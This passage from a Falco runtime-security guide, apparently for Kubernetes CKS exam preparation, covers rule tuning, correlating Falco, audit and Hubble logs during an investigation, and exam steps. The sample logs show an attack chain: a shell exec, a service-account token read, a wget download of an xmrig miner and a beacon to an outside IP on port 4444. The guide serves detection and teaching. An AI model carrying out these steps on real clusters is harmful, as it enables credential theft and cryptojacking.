Once `metrics.rules_counters_enabled: true` is set, Falco emits per-rule counters. Two rules typically dominate CPU: anything matching bare `open`/`openat` without a `pmatch` narrowing, and anything matching `connect` without a protocol filter.

```console
$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/metrics \
  | grep falcosecurity_rules_matches_total | sort -t' ' -k2 -rn | head -5
falcosecurity_rules_matches_total{rule_name="Write below binary dir",...} 88213
falcosecurity_rules_matches_total{rule_name="Read sensitive file untrusted",...} 41022
falcosecurity_rules_matches_total{rule_name="New executable written to container filesystem",...} 903
falcosecurity_rules_matches_total{rule_name="Interactive shell spawned in container",...} 44
falcosecurity_rules_matches_total{rule_name="Drifted binary executed in container",...} 2

$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/metrics \
  | grep -E "falcosecurity_falco_(cpu_usage_perc|memory_rss)"
falcosecurity_falco_cpu_usage_perc{...} 2.34
falcosecurity_falco_memory_rss_mb{...} 187
```

88 213 matches for one rule means one of two things, and you must decide which: the environment genuinely does that (tune the rule with exclusions) or the rule is too broad (rewrite the condition). Never leave a rule producing four-digit daily volume at a paging priority — alert fatigue is a detection failure mode as real as a dropped syscall.

### 7.5 Correlating planes during an investigation

The workflow that turns three signals into one narrative:

```console
# 1. Kernel plane — what happened inside the container
$ kubectl -n falco logs -l app.kubernetes.io/name=falco --since=1h \
  | jq -r 'select(.output_fields["k8s.pod.name"]=="payments-api-7c9f8d6b54-k2vzp")
           | "\(.time) [\(.priority)] \(.rule) :: \(.output_fields["proc.cmdline"])"' \
  | sort
2026-08-05T11:14:03Z [Warning]  Interactive shell spawned in container :: sh
2026-08-05T11:14:11Z [Critical] Service account token read by suspicious process :: cat /var/run/…/token
2026-08-05T11:14:24Z [Notice]   New executable written to container filesystem :: wget -q -O /tmp/xmrig …
2026-08-05T11:14:38Z [Critical] Binary not in container image was executed :: /tmp/xmrig --version

# 2. API plane — who opened the door (see 6.5 for the audit policy itself)
$ sudo jq -r 'select(.objectRef.subresource=="exec" and .objectRef.name=="payments-api-7c9f8d6b54-k2vzp")
              | "\(.requestReceivedTimestamp) \(.user.username) \(.sourceIPs[0]) \(.requestURI)"' \
     /var/log/kubernetes/audit.log
2026-08-05T11:14:01.882Z dev-contractor@example.com 198.51.100.77 /api/v1/namespaces/prod-payments/pods/payments-api-7c9f8d6b54-k2vzp/exec?command=sh&stdin=true&tty=true

# 3. Network plane — where the data went
$ kubectl -n kube-system exec ds/cilium -- \
    hubble observe --pod prod-payments/payments-api-7c9f8d6b54-k2vzp --last 200 --type drop,trace
Aug  5 11:14:49.774: prod-payments/payments-api-…:41522 -> 203.0.113.10:4444 to-stack FORWARDED (TCP Flags: SYN)
Aug  5 11:14:52.118: prod-payments/payments-api-…:41522 <- 203.0.113.10:4444 to-endpoint FORWARDED (TCP Flags: SYN, ACK)
```

Two seconds separate the `kubectl exec` in the API audit log from the shell in the kernel log. That is the causal link. Without both planes you have "a shell appeared" — an event. With both you have "`dev-contractor@example.com`, from `198.51.100.77`, exec'd into a production payments Pod, read the service account token, dropped a miner, and beaconed to `203.0.113.10:4444`" — an incident report.

### 7.6 Exam-day operating procedure

The task pattern for this item is stable. Optimize for it:

1. **Find the config.** `find /etc/falco -type f` and read `falco.yaml` first — you need `rules_files` order and the global `priority`.
2. **Write the rule in `falco_rules.local.yaml` or `/etc/falco/rules.d/`.** Never edit `falco_rules.yaml`; it is overwritten by `falcoctl` and graders check that you did not.
3. **Match the requested output format literally.** If the task says "log time, uid and process name", the `output:` string contains exactly `%evt.time`, `%user.uid`, `%proc.name`, in that order, with the separator asked for.
4. **Validate before restarting.** `falco -V <yourfile>` — a syntax error costs you the whole task.
5. **Reload.** `systemctl restart falco` on a node; `kubectl rollout restart ds/falco -n falco` in-cluster.
6. **Trigger and confirm.** Actually run the malicious behaviour, then read `journalctl -u falco` or `kubectl logs`. Confirmed detection, not a plausible rule, is what is scored.
7. **Persist if asked.** `-o buffered_outputs=false` when writing to a file, and `cat` the file to verify content before moving on.

---

## 8. References

**CNCF / CKS**
- CKS Curriculum v1.34 — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- CNCF Curriculum repository — https://github.com/cncf/curriculum
- Certified Kubernetes Security Specialist (CKS) — https://www.cncf.io/training/certification/cks/

**Falco**
- Falco documentation — https://falco.org/docs/
- Rules: conditions, fields, syntax — https://falco.org/docs/concepts/rules/
- Supported fields for conditions and outputs — https://falco.org/docs/reference/rules/supported-fields/
- Rules overriding / appending — https://falco.org/docs/concepts/rules/overriding/
- Default rules and rule tags — https://falco.org/docs/reference/rules/default-rules/
- Falco configuration reference (`falco.yaml`) — https://falco.org/docs/reference/daemon/config-options/
- Falco CLI options — https://falco.org/docs/reference/daemon/cli-options/
- Drivers: kmod, eBPF probe, modern eBPF — https://falco.org/docs/concepts/event-sources/kernel/
- Dealing with syscall event drops — https://falco.org/docs/concepts/event-sources/dropped-events/
- Metrics and observability — https://falco.org/docs/metrics/
- Plugins (`container`, `k8smeta`, `k8saudit`) — https://falco.org/docs/concepts/plugins/
- Installing Falco on Kubernetes (Helm) — https://falco.org/docs/setup/kubernetes/
- `falcoctl` — https://github.com/falcosecurity/falcoctl
- Falcosidekick and its outputs — https://github.com/falcosecurity/falcosidekick
- `event-generator` — https://github.com/falcosecurity/event-generator
- Falco rules repository — https://github.com/falcosecurity/rules
- libs (libscap/libsinsp) — https://github.com/falcosecurity/libs

**Kubernetes**
- Auditing — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Security Checklist — https://kubernetes.io/docs/concepts/security/security-checklist/
- Seccomp: restrict a container's syscalls — https://kubernetes.io/docs/tutorials/security/seccomp/
- AppArmor — https://kubernetes.io/docs/tutorials/security/apparmor/
- Pod Security Standards — https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Kubernetes Security Concepts — https://kubernetes.io/docs/concepts/security/

**Complementary tooling**
- Cilium Tetragon documentation — https://tetragon.io/docs/
- Tetragon `TracingPolicy` reference — https://tetragon.io/docs/concepts/tracing-policy/
- Hubble observability — https://docs.cilium.io/en/stable/observability/hubble/
- Security Profiles Operator — https://github.com/kubernetes-sigs/security-profiles-operator
- SPO profile recording — https://github.com/kubernetes-sigs/security-profiles-operator/blob/main/installation-usage.md#record-profiles-from-workloads-with-profilerecordings
- Inspektor Gadget — https://www.inspektor-gadget.io/docs/
- KubeArmor — https://docs.kubearmor.io/
- Linux Audit (`auditd`) — https://github.com/linux-audit/audit-documentation/wiki
- `auditctl(8)` — https://man7.org/linux/man-pages/man8/auditctl.8.html
- `ausearch(8)` — https://man7.org/linux/man-pages/man8/ausearch.8.html
- sysdig (open source) — https://github.com/draios/sysdig/wiki

**Threat modelling**
- MITRE ATT&CK — Containers matrix — https://attack.mitre.org/matrices/enterprise/containers/
- MITRE ATT&CK — T1611 Escape to Host — https://attack.mitre.org/techniques/T1611/
- MITRE ATT&CK — T1552.001 Credentials In Files — https://attack.mitre.org/techniques/T1552/001/
- NSA/CISA Kubernetes Hardening Guide — https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
- CIS Kubernetes Benchmark — https://www.cisecurity.org/benchmark/kubernetes